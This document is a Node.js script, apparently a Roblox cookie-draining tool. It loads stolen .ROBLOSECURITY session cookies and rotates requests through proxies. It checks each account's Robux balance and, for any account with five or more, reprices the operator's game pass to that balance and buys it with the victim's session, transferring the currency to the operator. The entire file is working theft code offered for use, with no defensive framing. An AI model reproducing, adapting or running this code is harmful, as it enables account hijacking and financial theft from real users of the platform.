const request = require("request");
const readline = require("readline");
const fs = require("fs");
const chalk = require("chalk");
const config = require("./config.json");
const _ = require("lodash");
const rbx = require('./rbx.js');

let proxies = [];
let cookies = [];
let scanned = [];

let transferred = 0;
let transferAmount = 0;

const readProxies = () => {
  const fileExists = fs.existsSync(`./proxies.txt`);
  if (!fileExists)
    return console.log(
      `Please put proxies in proxies.txt for the program to work!`
    );

  console.log(`Reading proxies...`);

  const rl = readline.createInterface(fs.createReadStream(`./proxies.txt`));

  rl.on("line", (data) => {
    if (!data) return;

    proxies.push(data);
  });

  rl.on("close", () => {
    if (proxies.length < 1) return console.log(`No proxies available!`);

    console.log(`Read ${proxies.length} proxies!`);

    readCookies();
  });
};

const readCookies = () => {
  const fileExists = fs.existsSync(`./cookies.txt`);
  if (!fileExists)
    return console.log(
      `Please put cookies in cookies.txt for the program to work!`
    );

  console.log("Reading cookies...");

  const rl = readline.createInterface(fs.createReadStream(`./cookies.txt`));

  rl.on("line", (data) => {
    if (!data) return;

    let cookie = data
      .split(".--")
      .find((c) => c.startsWith("Sharing-this-will"));
    if (cookie) cookies.push(`_|WARNING:-DO-NOT-SHARE-THIS.--${cookie}`);
  });

  rl.on("close", () => {
    if (cookies.length < 1)
      return console.log(`No cookies in: ${workerData.filename}!`);

    console.log(`Read ${cookies.length} cookie(s)! Initializing...`);

    init();
  });
};

const init = () => {
  console.log(`Scanning cookies...`);
  let chunks = _.chunk(cookies, Math.ceil(cookies.length / config.tasks));
  let promises = [];

  chunks.forEach((chunk) => {
    let p = new Promise((res, rej) => {
      scanCookies(
        chunk,
        res,
        0,
        proxies[Math.floor(Math.random() * proxies.length)]
      );
    });

    promises.push(p);
  });

  Promise.all(promises).then(() => {
    console.log(`Cookies scanned successfully! Initializing transfer...`);

    transfer(0);
  });
};

const scanCookies = (chunk, resolve, position, proxy) => {
  if (!chunk[position]) {
    return resolve();
  }

  request.get(
    "https://api.roblox.com/currency/balance",
    {
      headers: {
        Cookie: `.ROBLOSECURITY=${chunk[position]}`,
      },
      json: true,
      proxy: `http://${proxy}`,
    },
    (error, response, body) => {
      if (error) {
        console.log(chalk.yellow("Network error! Retrying..."));

        return scanCookies(
          chunk,
          resolve,
          position,
          proxies[Math.floor(Math.random() * proxies.length)]
        );
      }

      if (!body) {
        console.log(
          chalk.red(
            `Body was not sent in response! Status: ${response.statusCode}`
          )
        );
        return scanCookies(chunk, resolve, position + 1, proxy);
      }

      if (body.robux !== undefined) {
        if (body.robux >= 5) {
          console.log(chalk.green(`Valid cookie! Balance: ${body.robux}`));

          scanned.push({ cookie: chunk[position], robux: body.robux });
          transferAmount += body.robux;
        } else {
          console.log(
            chalk.magenta(`Valid cookie with <5R$! Balance: ${body.robux}`)
          );
        }
      } else {
        console.log(chalk.red("Cookie invalid or account banned!"));
      }

      scanCookies(chunk, resolve, position + 1, proxy);
    }
  );
};

const transfer = (position) => {
  if (!scanned[position]) return console.log(chalk.blue("Done"));

  request.post(
    "https://www.roblox.com/game-pass/update",
    {
      headers: {
        Cookie: `.ROBLOSECURITY=${config.cookie}`,
      },
      proxy: `http://${config.proxy}`,
    },
    (error, response, body) => {
      if (error) {
        console.log(chalk.yellow("Network error! Retrying..."));

        return transfer(position);
      }

      let xsrf = response.headers["x-csrf-token"];

      if (!xsrf) return console.log(chalk.red("Failed to get XSRF!"));

      request.post(
        "https://www.roblox.com/game-pass/update",
        {
          headers: {
            Cookie: `.ROBLOSECURITY=${config.cookie}`,
            "X-CSRF-TOKEN": xsrf,
          },
          proxy: `http://${config.proxy}`,
          json: { id: config.gamePassId, isForSale: true, price: scanned[position].robux },
        },
        (error, response, body) => {
          if (error) {
            console.log(chalk.yellow("Network error! Retrying..."));

            return transfer(position);
          }

          if(response.statusCode !== 200) {
              console.log(chalk.red(`Failed to change the price! Status: ${response.statusCode}`));
              return transfer(position);
          }

          rbx.buyAsset(config.gamePassId, scanned[position].cookie, scanned[position].robux, proxies[Math.floor(Math.random() * proxies.length)]).then(result => {
            console.log(result);
            transfer(position+1);
          }).catch(err => {
              console.log(chalk.red(err.data));
              if(err.retry) return transfer(position);

              transfer(position+1);
          })
        }
      );
    }
  );
};

readProxies();
